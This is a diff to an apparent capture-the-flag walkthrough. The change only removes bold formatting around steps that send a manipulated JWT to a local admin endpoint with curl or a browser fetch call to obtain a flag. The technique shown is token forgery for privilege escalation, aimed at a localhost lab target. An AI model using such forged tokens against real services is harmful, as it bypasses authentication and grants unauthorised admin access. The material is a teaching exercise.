@@ -40,12 +40,12 @@ You can use one of the following methods to send the modified JWT to the server:
 a. Using cURL (command line):
   •	Open your terminal and type:
   
-    **curl -H "Authorization: Bearer MANIPULATED-JWT" http://localhost:3000/admin**
+    curl -H "Authorization: Bearer MANIPULATED-JWT" http://localhost:3000/admin
 
 b. Using the Browser Console:
   •	Run this JavaScript:
   
-**    fetch("http://localhost:3000/admin", {
+    fetch("http://localhost:3000/admin", {
         method: "GET",
         headers: {
             "Authorization": "Bearer MANIPULATED-JWT"
@@ -53,7 +53,7 @@ b. Using the Browser Console:
     })
     .then(response => response.json())
     .then(data => console.log(data))
-    .catch(error => console.error("Error:", error));**
+    .catch(error => console.error("Error:", error));
 
 6. Access the Admin Endpoint and Retrieve the Flag
 a. The server will decode the manipulated token and grant admin access.
